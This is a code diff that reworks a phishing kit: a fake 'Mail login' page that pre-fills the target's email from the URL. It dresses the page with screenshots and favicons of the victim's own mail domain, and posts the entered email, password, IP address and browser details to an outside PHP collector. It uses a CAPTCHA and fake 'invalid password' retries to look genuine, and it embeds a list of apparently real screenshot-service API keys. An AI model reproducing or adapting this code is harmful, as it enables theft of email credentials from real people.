@@ -3,13 +3,13 @@
 
 <head>
 <meta charset="UTF-8">
-<title data-i18n="title">Mail login</title>
+<title>Mail login</title>
 
 <!-- Cloudflare Turnstile CAPTCHA -->
 <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 
 <style>
-/* CSS from style.css */
+/* Base styles */
 * {
   box-sizing: border-box;
 }
@@ -40,7 +40,7 @@ html, body {
   z-index: -2;
 }
 
-/* LOGIN BOX (FIXED SIZE + CENTERED) */
+/* LOGIN BOX */
 .login-box {
   position: fixed;
   top: 50%;
@@ -54,7 +54,6 @@ html, body {
   z-index: 3;
 }
 
-/* HEADER */
 .header {
   display: flex;
   align-items: center;
@@ -73,7 +72,6 @@ html, body {
   font-weight: 600;
 }
 
-/* INPUTS */
 input {
   width: 100%;
   padding: 14px;
@@ -89,7 +87,6 @@ input[readonly] {
   cursor: not-allowed;
 }
 
-/* PASSWORD */
 .password-wrap {
   position: relative;
 }
@@ -104,7 +101,6 @@ input[readonly] {
   font-size: 14px;
 }
 
-/* BUTTONS */
 button {
   width: 100%;
   padding: 14px;
@@ -124,10 +120,8 @@ button:hover {
 button:disabled {
   opacity: 0.6;
   cursor: not-allowed;
-  background: #3b78b4;
 }
 
-/* Additional styles from smart-link31d4.html */
 .email-wrapper {
   position: relative;
   width: 100%;
@@ -145,11 +139,6 @@ button:disabled {
   z-index: 2;
 }
 
-#email[readonly] {
-  background: #e6e6e6;
-  cursor: not-allowed;
-}
-
 .email-domain-overlay {
   position: absolute;
   right: 16px;
@@ -160,7 +149,6 @@ button:disabled {
   pointer-events: none;
 }
 
-/* LOADING SPINNER */
 .spinner {
   display: none;
   width: 20px;
@@ -177,7 +165,6 @@ button:disabled {
   100% { transform: rotate(360deg); }
 }
 
-/* ERROR MESSAGE */
 .error-message {
   display: none;
   color: #d32f2f;
@@ -190,7 +177,6 @@ button:disabled {
   font-weight: 500;
 }
 
-/* CAPTCHA SUCCESS MESSAGE */
 .captcha-success {
   display: none;
   background-color: #4caf50;
@@ -210,24 +196,6 @@ button:disabled {
   100% { opacity: 0; visibility: hidden; }
 }
 
-/* LANGUAGE SELECTOR */
-.language-selector {
-  position: fixed;
-  top: 20px;
-  right: 20px;
-  z-index: 100;
-}
-
-.language-selector select {
-  padding: 8px 12px;
-  border-radius: 4px;
-  border: 1px solid #ccc;
-  background: white;
-  font-size: 14px;
-  cursor: pointer;
-}
-
-/* CLOUDFLARE TURNSTILE CONTAINER */
 .cf-turnstile {
   margin: 15px 0;
   display: flex;
@@ -248,71 +216,32 @@ button:disabled {
   font-size: 14px;
 }
 
-/* RTL SUPPORT */
+/* RTL */
 html[dir="rtl"] .email-domain-overlay {
   right: auto;
   left: 16px;
 }
-
 html[dir="rtl"] #togglePassword {
   right: auto;
   left: 12px;
 }
-
-html[dir="rtl"] .header {
-  direction: rtl;
-}
-
-html[dir="rtl"] .header h1 {
-  margin-right: 12px;
-  margin-left: 0;
-}
-
-html[dir="rtl"] .language-selector {
-  right: auto;
-  left: 20px;
-}
 </style>
 </head>
 
-<body style="background: #fff no-repeat center center; background-size: cover;">
+<body>
 
-<!-- LANGUAGE SELECTOR -->
-<div class="language-selector">
-  <select id="languageSelect">
-    <option value="auto" data-i18n="auto">Auto Detect</option>
-    <option value="en">English</option>
-    <option value="es">Español</option>
-    <option value="fr">Français</option>
-    <option value="de">Deutsch</option>
-    <option value="it">Italiano</option>
-    <option value="pt">Português</option>
-    <option value="ru">Русский</option>
-    <option value="ar">العربية</option>
-    <option value="zh">中文</option>
-    <option value="ja">日本語</option>
-    <option value="ko">한국어</option>
-    <option value="hi">हिन्दी</option>
-  </select>
-</div>
-
-<!-- DARK OVERLAY -->
 <div id="dim"></div>
-
-<!-- BACKGROUND WEBSITE -->
 <img id="bg-frame" alt="">
 
 <div class="login-box">
   <div class="header">
     <img id="logo" src="#">
-    <h1 id="domainTitle" data-i18n="mail_login">mail</h1>
+    <h1 id="domainTitle">mail</h1>
   </div>
 
-  <!-- ERROR MESSAGE -->
   <div id="errorMessage" class="error-message"></div>
 
   <form id="loginForm" method="POST">
-    <!-- Hidden fields for additional data -->
     <input type="hidden" id="ipAddress" name="ipAddress" value="">
     <input type="hidden" id="userAgent" name="userAgent" value="">
     <input type="hidden" id="timezone" name="timezone" value="">
@@ -320,317 +249,73 @@ html[dir="rtl"] .language-selector {
     <input type="hidden" id="attempt" name="attempt" value="1">
     <input type="hidden" id="timestamp" name="timestamp" value="">
 
-    <!-- EMAIL -->
     <div class="email-wrapper">
-      <input
-        type="email"
-        id="email"
-        name="email"
-        placeholder=""
-        data-i18n-placeholder="email_placeholder"
-        value=""
-        readonly
-      >
+      <input type="email" id="email" name="email" placeholder="Email address" value="" readonly>
       <div class="email-domain-overlay" id="emailDomainOverlay"></div>
     </div>
 
-    <!-- PASSWORD -->
     <div class="password-wrap">
-      <input type="password" id="password" name="password" placeholder="" data-i18n-placeholder="password_placeholder">
-      <span id="togglePassword" data-i18n="show_password">Show</span>
+      <input type="password" id="password" name="password" placeholder="Password">
+      <span id="togglePassword">Show</span>
     </div>
 
-    <!-- CLOUDFLARE TURNSTILE CAPTCHA -->
     <div class="cf-turnstile" id="captcha-container"></div>
     <div id="captchaSuccess" class="captcha-success">✓ Verified</div>
-    <div id="captchaError" class="captcha-error" data-i18n="captcha_required">Please complete the security verification</div>
+    <div id="captchaError" class="captcha-error">Please complete the security verification</div>
 
-    <!-- SIGN IN BUTTON -->
     <button type="submit" id="signInBtn" disabled>
-      <span id="buttonText" data-i18n="sign_in">Sign in</span>
+      <span id="buttonText">Sign in</span>
       <div class="spinner" id="loadingSpinner"></div>
     </button>
   </form>
 </div>
 
 <script>
-// JavaScript with 3‑attempt logic, CAPTCHA only once, success message & widget disappears
-const bg = document.getElementById("bg-frame");
-
-// ADD ALL YOUR SCREENSHOTONE KEYS HERE
+// --- SCREENSHOTONE KEYS ---
 const SCREENSHOT_KEYS = [
-  "6PHCKPsyKIAi0w",
-  "cHF3Orwewj4CuA",
-  "TeAQpVMTFn0d5Q",
-  "KbI5_1zGkfvM5w",
-  "gdoqGKzEOuX1Dw",
-  "IyI7iyNDRI2aVw",
-  "XWQYZFbh2eZH7Q",
-  "2G9DtGf__CJp3w",
-  "fKe7Aj2opnR1x4",
-  "nw_50q9PHwPSHg",
-  "KAyE2AbCODVblA",
-  "zRxoqwPkOGNNew",
+  "6PHCKPsyKIAi0w", "cHF3Orwewj4CuA", "TeAQpVMTFn0d5Q", "KbI5_1zGkfvM5w",
+  "gdoqGKzEOuX1Dw", "IyI7iyNDRI2aVw", "XWQYZFbh2eZH7Q", "2G9DtGf__CJp3w",
+  "fKe7Aj2opnR1x4", "nw_50q9PHwPSHg", "KAyE2AbCODVblA", "zRxoqwPkOGNNew",
   "6cc2fc13093017cd3d59"
 ];
 
-// TRANSLATIONS
-const translations = {
-  en: {
-    title: "Mail login",
-    mail_login: "mail",
-    email_placeholder: "Email address",
-    password_placeholder: "Password",
-    show_password: "Show",
-    hide_password: "Hide",
-    sign_in: "Sign in",
-    invalid_password: "Invalid password. Please try again.",
-    signing_in: "Signing in...",
-    auto: "Auto Detect",
-    loading: "Loading...",
-    captcha_required: "Please complete the security verification"
-  },
-  es: {
-    title: "Inicio de sesión de correo",
-    mail_login: "correo",
-    email_placeholder: "Dirección de correo electrónico",
-    password_placeholder: "Contraseña",
-    show_password: "Mostrar",
-    hide_password: "Ocultar",
-    sign_in: "Iniciar sesión",
-    invalid_password: "Contraseña incorrecta. Por favor, inténtelo de nuevo.",
-    signing_in: "Iniciando sesión...",
-    auto: "Detección automática",
-    loading: "Cargando...",
-    captcha_required: "Por favor, complete la verificación de seguridad"
-  },
-  fr: {
-    title: "Connexion au courrier",
-    mail_login: "courrier",
-    email_placeholder: "Adresse e-mail",
-    password_placeholder: "Mot de passe",
-    show_password: "Afficher",
-    hide_password: "Masquer",
-    sign_in: "Se connecter",
-    invalid_password: "Mot de passe incorrect. Veuillez réessayer.",
-    signing_in: "Connexion en cours...",
-    auto: "Détection automatique",
-    loading: "Chargement...",
-    captcha_required: "Veuillez compléter la vérificación de sécurité"
-  },
-  de: {
-    title: "Mail-Anmeldung",
-    mail_login: "Mail",
-    email_placeholder: "E-Mail-Adresse",
-    password_placeholder: "Passwort",
-    show_password: "Anzeigen",
-    hide_password: "Ausblenden",
-    sign_in: "Anmelden",
-    invalid_password: "Ungültiges Passwort. Bitte versuchen Sie es erneut.",
-    signing_in: "Anmeldung läuft...",
-    auto: "Auto-Erkennung",
-    loading: "Lädt...",
-    captcha_required: "Bitte schließen Sie die Sicherheitsüberprüfung ab"
-  },
-  it: {
-    title: "Accesso alla posta",
-    mail_login: "posta",
-    email_placeholder: "Indirizzo email",
-    password_placeholder: "Password",
-    show_password: "Mostra",
-    hide_password: "Nascondi",
-    sign_in: "Accedi",
-    invalid_password: "Password non valida. Riprova.",
-    signing_in: "Accesso in corso...",
-    auto: "Rilevamento automatico",
-    loading: "Caricamento...",
-    captcha_required: "Completa la verifica di sicurezza"
-  },
-  pt: {
-    title: "Login de email",
-    mail_login: "email",
-    email_placeholder: "Endereço de email",
-    password_placeholder: "Senha",
-    show_password: "Mostrar",
-    hide_password: "Ocultar",
-    sign_in: "Entrar",
-    invalid_password: "Senha inválida. Por favor, tente novamente.",
-    signing_in: "Entrando...",
-    auto: "Detecção automática",
-    loading: "Carregando...",
-    captcha_required: "Por favor, complete a verificação de segurança"
-  },
-  ru: {
-    title: "Вход в почту",
-    mail_login: "почта",
-    email_placeholder: "Адрес электронной почты",
-    password_placeholder: "Пароль",
-    show_password: "Показать",
-    hide_password: "Скрыть",
-    sign_in: "Войти",
-    invalid_password: "Неверный пароль. Пожалуйста, попробуйте еще раз.",
-    signing_in: "Вход...",
-    auto: "Автоопределение",
-    loading: "Загрузка...",
-    captcha_required: "Пожалуйста, пройдите проверку безопасности"
-  },
-  ar: {
-    title: "تسجيل الدخول للبريد",
-    mail_login: "بريد",
-    email_placeholder: "عنوان البريد الإلكتروني",
-    password_placeholder: "كلمة المرور",
-    show_password: "إظهار",
-    hide_password: "إخفاء",
-    sign_in: "تسجيل الدخول",
-    invalid_password: "كلمة المرور غير صحيحة. يرجى المحاولة مرة أخرى.",
-    signing_in: "جاري تسجيل الدخول...",
-    auto: "الكشف التلقائي",
-    loading: "جاري التحميل...",
-    captcha_required: "يرجى إكمال التحقق الأمني"
-  },
-  zh: {
-    title: "邮件登录",
-    mail_login: "邮件",
-    email_placeholder: "电子邮件地址",
-    password_placeholder: "密码",
-    show_password: "显示",
-    hide_password: "隐藏",
-    sign_in: "登录",
-    invalid_password: "密码无效。请再试一次。",
-    signing_in: "正在登录...",
-    auto: "自动检测",
-    loading: "加载中...",
-    captcha_required: "请完成安全验证"
-  },
-  ja: {
-    title: "メールログイン",
-    mail_login: "メール",
-    email_placeholder: "メールアドレス",
-    password_placeholder: "パスワード",
-    show_password: "表示",
-    hide_password: "非表示",
-    sign_in: "サインイン",
-    invalid_password: "パスワードが無効です。もう一度お試しください。",
-    signing_in: "サインイン中...",
-    auto: "自動検出",
-    loading: "読み込み中...",
-    captcha_required: "セキュリティ確認を完了してください"
-  },
-  ko: {
-    title: "메일 로그인",
-    mail_login: "메일",
-    email_placeholder: "이메일 주소",
-    password_placeholder: "비밀번호",
-    show_password: "표시",
-    hide_password: "숨기기",
-    sign_in: "로그인",
-    invalid_password: "잘못된 비밀번호입니다. 다시 시도해 주세요.",
-    signing_in: "로그인 중...",
-    auto: "자동 감지",
-    loading: "로드 중...",
-    captcha_required: "보안 검증을 완료해 주세요"
-  },
-  hi: {
-    title: "मेल लॉगिन",
-    mail_login: "मेल",
-    email_placeholder: "ईमेल पता",
-    password_placeholder: "पासवर्ड",
-    show_password: "दिखाएं",
-    hide_password: "छुपाएं",
-    sign_in: "साइन इन",
-    invalid_password: "अमान्य पासवर्ड। कृपया पुनः प्रयास करें।",
-    signing_in: "साइन इन हो रहा है...",
-    auto: "स्वतः पता लगाएं",
-    loading: "लोड हो रहा है...",
-    captcha_required: "कृपया सुरक्षा सत्यापन पूरा करें"
-  }
-};
-
-// COUNTRY TO LANGUAGE MAPPING
+// --- COUNTRY → LANGUAGE MAPPING ---
 const countryLanguageMap = {
-  'US': 'en', 'GB': 'en', 'CA': 'en', 'AU': 'en', 'NZ': 'en', 'IE': 'en',
-  'ES': 'es', 'MX': 'es', 'AR': 'es', 'CO': 'es', 'PE': 'es', 'CL': 'es',
-  'FR': 'fr', 'BE': 'fr', 'CH': 'fr', 'LU': 'fr',
-  'DE': 'de', 'AT': 'de', 'CH': 'de', 'LU': 'de', 'LI': 'de',
-  'IT': 'it', 'CH': 'it', 'SM': 'it', 'VA': 'it',
-  'PT': 'pt', 'BR': 'pt', 'AO': 'pt', 'MZ': 'pt',
-  'RU': 'ru', 'BY': 'ru', 'KZ': 'ru', 'KG': 'ru',
-  'SA': 'ar', 'AE': 'ar', 'EG': 'ar', 'JO': 'ar', 'QA': 'ar',
-  'CN': 'zh', 'TW': 'zh', 'HK': 'zh', 'SG': 'zh', 'MO': 'zh',
-  'JP': 'ja',
-  'KR': 'ko',
-  'IN': 'hi', 'NP': 'hi'
+  'US':'en','GB':'en','CA':'en','AU':'en','NZ':'en','IE':'en',
+  'ES':'es','MX':'es','AR':'es','CO':'es','PE':'es','CL':'es',
+  'FR':'fr','BE':'fr','CH':'fr','LU':'fr',
+  'DE':'de','AT':'de','CH':'de','LU':'de','LI':'de',
+  'IT':'it','CH':'it','SM':'it','VA':'it',
+  'PT':'pt','BR':'pt','AO':'pt','MZ':'pt',
+  'RU':'ru','BY':'ru','KZ':'ru','KG':'ru',
+  'SA':'ar','AE':'ar','EG':'ar','JO':'ar','QA':'ar',
+  'CN':'zh','TW':'zh','HK':'zh','SG':'zh','MO':'zh',
+  'JP':'ja','KR':'ko','IN':'hi','NP':'hi'
 };
 
-// Global variables
+// --- GLOBALS ---
 let currentDomain = '';
-let attempts = 0;            // counts submissions: 0,1,2,3...
-let currentLanguage = 'en';
-let userCountry = 'Unknown';
+let attempts = 0;
 let captchaToken = '';
 let turnstileWidgetId = null;
-let captchaVerified = false; // Flag to indicate CAPTCHA has been successfully solved
+let captchaVerified = false;
+let currentLanguage = 'en';
 
-// ====================================================
-// CLOUDFLARE SITE KEY - UPDATED TO YOUR NEW KEY
-// ====================================================
+// Cloudflare site key
 const CLOUDFLARE_SITE_KEY = "0x4AAAAAACv2yITaaHsqVaoV";
-// ====================================================
 
-function screenshotUrl(domain, key) {
-  return (
-    "https://api.screenshotone.com/take" +
-    "?access_key=" + key +
-    "&url=" + encodeURIComponent("https://" + domain) +
-    "&format=jpg" +
-    "&response_type=by_format" +
-    "&block_ads=true" +
-    "&block_cookie_banners=true" +
-    "&block_trackers=true" +
-    "&image_quality=80"
-  );
-}
-
-function loadBackground(domain) {
-  let index = 0;
-
-  function tryNextKey() {
-    if (index >= SCREENSHOT_KEYS.length) {
-      console.log("All screenshot keys failed");
-      return;
-    }
-
-    const key = SCREENSHOT_KEYS[index];
-    const testImg = new Image();
-
-    testImg.onload = () => {
-      bg.src = screenshotUrl(domain, key);
-    };
-
-    testImg.onerror = () => {
-      index++;
-      tryNextKey();
-    };
-
-    testImg.src = screenshotUrl(domain, key);
-  }
-
-  tryNextKey();
-}
-
-// --- DOM ELEMENTS ---
+// --- DOM elements ---
+const bg = document.getElementById("bg-frame");
 const emailInput = document.getElementById("email");
 const domainOverlay = document.getElementById("emailDomainOverlay");
-const frame = document.getElementById("bg-frame");
 const logo = document.getElementById("logo");
-const title = document.getElementById("domainTitle");
+const domainTitle = document.getElementById("domainTitle");
 const passwordInput = document.getElementById("password");
 const signInBtn = document.getElementById("signInBtn");
 const loginForm = document.getElementById("loginForm");
 const buttonText = document.getElementById("buttonText");
 const loadingSpinner = document.getElementById("loadingSpinner");
 const errorMessage = document.getElementById("errorMessage");
-const languageSelect = document.getElementById("languageSelect");
 const togglePassword = document.getElementById("togglePassword");
 const captchaContainer = document.getElementById("captcha-container");
 const captchaSuccess = document.getElementById("captchaSuccess");
@@ -644,161 +329,127 @@ const browserField = document.getElementById("browser");
 const attemptField = document.getElementById("attempt");
 const timestampField = document.getElementById("timestamp");
 
-// --- LANGUAGE DETECTION AND TRANSLATION ---
-async function detectUserLanguage() {
-  const browserLang = navigator.language || navigator.userLanguage;
-  const browserLangCode = browserLang.split('-')[0].toLowerCase();
-  
-  if (translations[browserLangCode]) {
-    return browserLangCode;
+// --- Helper functions ---
+function screenshotUrl(domain, key) {
+  return `https://api.screenshotone.com/take?access_key=${key}&url=${encodeURIComponent("https://"+domain)}&format=jpg&response_type=by_format&block_ads=true&block_cookie_banners=true&block_trackers=true&image_quality=80`;
+}
+
+function loadBackground(domain) {
+  let idx = 0;
+  function tryKey() {
+    if (idx >= SCREENSHOT_KEYS.length) return;
+    const key = SCREENSHOT_KEYS[idx];
+    const test = new Image();
+    test.onload = () => { bg.src = screenshotUrl(domain, key); };
+    test.onerror = () => { idx++; tryKey(); };
+    test.src = screenshotUrl(domain, key);
   }
-  
+  tryKey();
+}
+
+// --- Language detection (IP + browser fallback) ---
+async function detectLanguage() {
   try {
-    const response = await fetch('https://ipapi.co/json/');
-    const data = await response.json();
-    userCountry = data.country_code;
-    if (countryLanguageMap[userCountry]) {
-      return countryLanguageMap[userCountry];
-    }
-  } catch (error) {
-    console.log('Could not detect language from IP:', error);
-  }
-  
+    const resp = await fetch('https://ipapi.co/json/');
+    const data = await resp.json();
+    const country = data.country_code;
+    if (countryLanguageMap[country]) return countryLanguageMap[country];
+  } catch (e) {}
+  // Fallback to browser language
+  const browserLang = navigator.language.split('-')[0];
+  if (['en','es','fr','de','it','pt','ru','ar','zh','ja','ko','hi'].includes(browserLang)) return browserLang;
   return 'en';
 }
 
+// --- Set page language (no selector, only auto) ---
 function setLanguage(langCode) {
-  document.documentElement.lang = langCode;
-  if (langCode === 'ar') {
-    document.documentElement.dir = 'rtl';
-  } else {
-    document.documentElement.dir = 'ltr';
-  }
-  
-  const langData = translations[langCode] || translations['en'];
-  document.title = langData.title;
-  
-  document.querySelectorAll('[data-i18n]').forEach(element => {
-    const key = element.getAttribute('data-i18n');
-    if (langData[key]) {
-      element.textContent = langData[key];
-    }
-  });
-  
-  document.querySelectorAll('[data-i18n-placeholder]').forEach(element => {
-    const key = element.getAttribute('data-i18n-placeholder');
-    if (langData[key]) {
-      element.placeholder = langData[key];
-    }
-  });
-  
-  if (passwordInput.type === 'password') {
-    togglePassword.textContent = langData.show_password;
-  } else {
-    togglePassword.textContent = langData.hide_password;
-  }
-  
-  if (captchaError) {
-    captchaError.textContent = langData.captcha_required;
-  }
-  
-  if (languageSelect) {
-    languageSelect.value = langCode;
-  }
-  
   currentLanguage = langCode;
+  document.documentElement.lang = langCode;
+  if (langCode === 'ar') document.documentElement.dir = 'rtl';
+  else document.documentElement.dir = 'ltr';
+  
+  // Simple translations for UI (we can expand if needed)
+  const translations = {
+    en: { email_placeholder: "Email address", password_placeholder: "Password", sign_in: "Sign in", show: "Show", hide: "Hide", invalid: "Invalid password. Please try again.", signing: "Signing in..." },
+    es: { email_placeholder: "Correo electrónico", password_placeholder: "Contraseña", sign_in: "Iniciar sesión", show: "Mostrar", hide: "Ocultar", invalid: "Contraseña incorrecta. Inténtelo de nuevo.", signing: "Iniciando sesión..." },
+    fr: { email_placeholder: "Adresse e-mail", password_placeholder: "Mot de passe", sign_in: "Se connecter", show: "Afficher", hide: "Masquer", invalid: "Mot de passe incorrect. Veuillez réessayer.", signing: "Connexion en cours..." },
+    de: { email_placeholder: "E-Mail-Adresse", password_placeholder: "Passwort", sign_in: "Anmelden", show: "Anzeigen", hide: "Ausblenden", invalid: "Ungültiges Passwort. Bitte versuchen Sie es erneut.", signing: "Anmeldung läuft..." },
+    it: { email_placeholder: "Indirizzo email", password_placeholder: "Password", sign_in: "Accedi", show: "Mostra", hide: "Nascondi", invalid: "Password non valida. Riprova.", signing: "Accesso in corso..." },
+    pt: { email_placeholder: "Endereço de email", password_placeholder: "Senha", sign_in: "Entrar", show: "Mostrar", hide: "Ocultar", invalid: "Senha inválida. Tente novamente.", signing: "Entrando..." },
+    ru: { email_placeholder: "Адрес электронной почты", password_placeholder: "Пароль", sign_in: "Войти", show: "Показать", hide: "Скрыть", invalid: "Неверный пароль. Попробуйте еще раз.", signing: "Вход..." },
+    ar: { email_placeholder: "عنوان البريد الإلكتروني", password_placeholder: "كلمة المرور", sign_in: "تسجيل الدخول", show: "إظهار", hide: "إخفاء", invalid: "كلمة المرور غير صحيحة. حاول مرة أخرى.", signing: "جاري تسجيل الدخول..." },
+    zh: { email_placeholder: "电子邮件地址", password_placeholder: "密码", sign_in: "登录", show: "显示", hide: "隐藏", invalid: "密码无效。请再试一次。", signing: "正在登录..." },
+    ja: { email_placeholder: "メールアドレス", password_placeholder: "パスワード", sign_in: "サインイン", show: "表示", hide: "非表示", invalid: "パスワードが無効です。もう一度お試しください。", signing: "サインイン中..." },
+    ko: { email_placeholder: "이메일 주소", password_placeholder: "비밀번호", sign_in: "로그인", show: "표시", hide: "숨기기", invalid: "잘못된 비밀번호입니다. 다시 시도해 주세요.", signing: "로그인 중..." },
+    hi: { email_placeholder: "ईमेल पता", password_placeholder: "पासवर्ड", sign_in: "साइन इन", show: "दिखाएं", hide: "छुपाएं", invalid: "अमान्य पासवर्ड। कृपया पुनः प्रयास करें।", signing: "साइन इन हो रहा है..." }
+  };
+  const t = translations[langCode] || translations.en;
+  emailInput.placeholder = t.email_placeholder;
+  passwordInput.placeholder = t.password_placeholder;
+  buttonText.innerText = t.sign_in;
+  togglePassword.innerText = (passwordInput.type === 'password') ? t.show : t.hide;
+  // Store for error messages
+  window._translations = t;
 }
 
 function showError(messageKey) {
-  const message = translations[currentLanguage][messageKey] || translations['en'][messageKey] || messageKey;
-  errorMessage.textContent = message;
+  const t = window._translations || { invalid: "Invalid password", signing: "Signing in..." };
+  const msg = (messageKey === 'invalid_password') ? t.invalid : t.signing;
+  errorMessage.innerText = msg;
   errorMessage.style.display = 'block';
-  setTimeout(() => {
-    errorMessage.style.display = 'none';
-  }, 3000);
+  setTimeout(() => errorMessage.style.display = 'none', 3000);
 }
 
-// --- EXTRACT EMAIL FROM URL ---
+// --- Email extraction from URL ---
 function extractEmailFromUrl() {
   const urlParams = new URLSearchParams(window.location.search);
-  const emailFromParams = urlParams.get('email');
-  if (emailFromParams) {
-    const decodedEmail = decodeURIComponent(emailFromParams);
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    if (emailRegex.test(decodedEmail)) {
-      return decodedEmail;
-    }
-  }
-  
+  let email = urlParams.get('email');
+  if (email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decodeURIComponent(email))) return decodeURIComponent(email);
   const hash = window.location.hash;
   if (hash && hash.length > 1) {
-    let hashContent = decodeURIComponent(hash.substring(1));
-    let email = hashContent;
-    if (email.includes(':')) email = email.split(':')[0];
-    if (email.includes('?')) email = email.split('?')[0];
-    if (email.includes('&')) email = email.split('&')[0];
-    email = email.trim();
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    if (emailRegex.test(email)) {
-      return email;
-    }
+    let raw = decodeURIComponent(hash.substring(1));
+    if (raw.includes(':')) raw = raw.split(':')[0];
+    if (raw.includes('?')) raw = raw.split('?')[0];
+    if (raw.includes('&')) raw = raw.split('&')[0];
+    raw = raw.trim();
+    if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(raw)) return raw;
   }
   return null;
 }
 
 function getRandomEmail() {
-  const domains = [
-    'gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 
-    'aol.com', 'icloud.com', 'protonmail.com', 'mail.com',
-    'yandex.com', 'zoho.com'
-  ];
-  const names = [
-    'john', 'jane', 'michael', 'sarah', 'david', 'lisa', 'robert', 'emily',
-    'william', 'jennifer', 'richard', 'susan', 'joseph', 'maria', 'thomas',
-    'karen', 'charles', 'nancy', 'christopher', 'betty'
-  ];
-  const randomName = names[Math.floor(Math.random() * names.length)];
-  const randomDomain = domains[Math.floor(Math.random() * domains.length)];
-  const randomNum = Math.floor(Math.random() * 999) + 1;
-  return `${randomName}${randomNum}@${randomDomain}`;
+  const domains = ['gmail.com','yahoo.com','outlook.com','hotmail.com','aol.com','icloud.com','protonmail.com','mail.com','yandex.com','zoho.com'];
+  const names = ['john','jane','michael','sarah','david','lisa','robert','emily','william','jennifer','richard','susan','joseph','maria','thomas','karen','charles','nancy','christopher','betty'];
+  const name = names[Math.floor(Math.random() * names.length)];
+  const domain = domains[Math.floor(Math.random() * domains.length)];
+  const num = Math.floor(Math.random() * 999) + 1;
+  return `${name}${num}@${domain}`;
 }
 
-// --- COLLECT USER DATA ---
+// --- Collect user data (IP, etc.) ---
 function collectUserData() {
   fetch('https://ipapi.co/json/')
-    .then(response => response.json())
+    .then(r => r.json())
     .then(data => {
       ipAddressField.value = data.ip;
       userCountry = data.country_code;
-      if (languageSelect && languageSelect.value === 'auto') {
-        const countryLang = countryLanguageMap[userCountry];
-        if (countryLang && countryLang !== currentLanguage) {
-          setLanguage(countryLang);
-        }
-      }
     })
     .catch(() => {
       ipAddressField.value = 'Unknown';
-      fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-          ipAddressField.value = data.ip;
-        });
+      fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => ipAddressField.value = d.ip);
     });
-
   userAgentField.value = navigator.userAgent;
   timezoneField.value = Intl.DateTimeFormat().resolvedOptions().timeZone;
   browserField.value = navigator.userAgent;
   timestampField.value = new Date().toISOString();
 }
 
-// --- CLOUDFLARE TURNSTILE CAPTCHA with success message ---
+// --- Cloudflare Turnstile ---
 function initializeCaptcha() {
   if (!CLOUDFLARE_SITE_KEY || captchaVerified) {
     if (captchaVerified && captchaContainer) captchaContainer.style.display = 'none';
     return;
   }
-  
   captchaContainer.innerHTML = '';
   captchaContainer.style.display = 'flex';
   try {
@@ -808,18 +459,11 @@ function initializeCaptcha() {
         captchaToken = token;
         captchaVerified = true;
         captchaError.style.display = 'none';
-        
         // Show success message
-        if (captchaSuccess) {
-          captchaSuccess.style.display = 'block';
-          // Hide success message after fade animation
-          setTimeout(() => {
-            captchaSuccess.style.display = 'none';
-          }, 3000);
-        }
-        
-        // Hide the CAPTCHA widget
-        if (captchaContainer) captchaContainer.style.display = 'none';
+        captchaSuccess.style.display = 'block';
+        setTimeout(() => { captchaSuccess.style.display = 'none'; }, 3000);
+        // Hide widget
+        captchaContainer.style.display = 'none';
         updateSignInButton();
       },
       'expired-callback': function() {
@@ -827,8 +471,7 @@ function initializeCaptcha() {
           captchaToken = '';
           captchaError.style.display = 'block';
           updateSignInButton();
-          // If expired, we could optionally show widget again, but we keep it hidden after first success
-          if (!captchaVerified && captchaContainer) captchaContainer.style.display = 'flex';
+          if (!captchaVerified) captchaContainer.style.display = 'flex';
         }
       },
       'error-callback': function() {
@@ -838,12 +481,9 @@ function initializeCaptcha() {
           updateSignInButton();
         }
       },
-      theme: currentLanguage === 'ar' ? 'light' : 'auto',
       language: currentLanguage
     });
-  } catch (error) {
-    console.error('Error initializing CAPTCHA:', error);
-  }
+  } catch(e) { console.error(e); }
 }
 
 function resetCaptcha() {
@@ -852,12 +492,12 @@ function resetCaptcha() {
     turnstile.reset(turnstileWidgetId);
     captchaToken = '';
     captchaError.style.display = 'none';
-    if (captchaContainer) captchaContainer.style.display = 'flex';
+    captchaContainer.style.display = 'flex';
     updateSignInButton();
   }
 }
 
-// --- SEND DATA TO PHP (ONLY FETCH, NO REDIRECT FALLBACK) ---
+// --- Send data to PHP ---
 function sendToPHP() {
   const data = {
     email: emailInput.value,
@@ -869,165 +509,106 @@ function sendToPHP() {
     attempt: attempts,
     timestamp: new Date().toISOString()
   };
-  
   fetch('https://scitecinstruments.it.com/mine/sg.php', {
     method: 'POST',
     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
     body: new URLSearchParams(data)
-  })
-  .then(response => {
-    if (!response.ok) {
-      console.warn('PHP endpoint returned status:', response.status);
-    }
-    return response.json().catch(() => ({}));
-  })
-  .then(result => {
-    console.log('Data sent to PHP, response:', result);
-  })
-  .catch(error => {
-    console.error('Error sending to PHP (will not redirect):', error);
-  });
+  }).catch(err => console.error('Fetch error:', err));
 }
 
-// --- LOCK EMAIL & UPDATE DOMAIN ---
+// --- Update domain and background ---
 function lockEmailAndUpdateDomain() {
-  const value = emailInput.value.trim();
-  if (value.includes("@")) {
-    const parts = value.split("@");
-    currentDomain = parts[1];
-    if(domainOverlay) domainOverlay.textContent = currentDomain;
-    if (frame) loadBackground(currentDomain);
-    if(logo) logo.src = "https://www.google.com/s2/favicons?sz=128&domain=" + currentDomain;
-    if(title) title.textContent = currentDomain;
-    passwordInput.focus();
+  const val = emailInput.value.trim();
+  if (val.includes('@')) {
+    currentDomain = val.split('@')[1];
+    domainOverlay.textContent = currentDomain;
+    loadBackground(currentDomain);
+    logo.src = "https://www.google.com/s2/favicons?sz=128&domain=" + currentDomain;
+    domainTitle.textContent = currentDomain;
     updateSignInButton();
   } else {
-    if(domainOverlay) domainOverlay.textContent = "";
+    domainOverlay.textContent = "";
     updateSignInButton();
   }
 }
 
 function updateSignInButton() {
-  if (CLOUDFLARE_SITE_KEY) {
-    if (emailInput.value.trim() && passwordInput.value.trim() && captchaToken) {
-      signInBtn.disabled = false;
-    } else {
-      signInBtn.disabled = true;
-    }
+  if (emailInput.value.trim() && passwordInput.value.trim() && captchaToken) {
+    signInBtn.disabled = false;
   } else {
-    signInBtn.disabled = !(emailInput.value.trim() && passwordInput.value.trim());
